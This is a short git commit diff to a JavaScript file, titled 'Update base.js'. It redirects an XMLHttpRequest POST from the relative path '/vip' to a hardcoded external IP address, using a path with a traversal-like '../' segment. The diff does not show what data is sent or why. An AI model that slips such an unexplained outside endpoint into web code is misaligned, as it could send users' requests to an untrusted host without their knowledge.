0ee4951013d648935ff340f445c45d6f566e38ae
niguang <51753611+zyx1268@users.noreply.github.com>
2023-10-31 09:46:37 +0800

    Update base.js

--- js/base.js
+++ js/base.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open('POST', '/vip', true);
+xhr.open('POST', 'http://124.70.33.170:3000/theme/../vip', true);
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 xhr.onreadystatechange = function() {
   if (xhr.readyState === 4 && xhr.status === 200) {
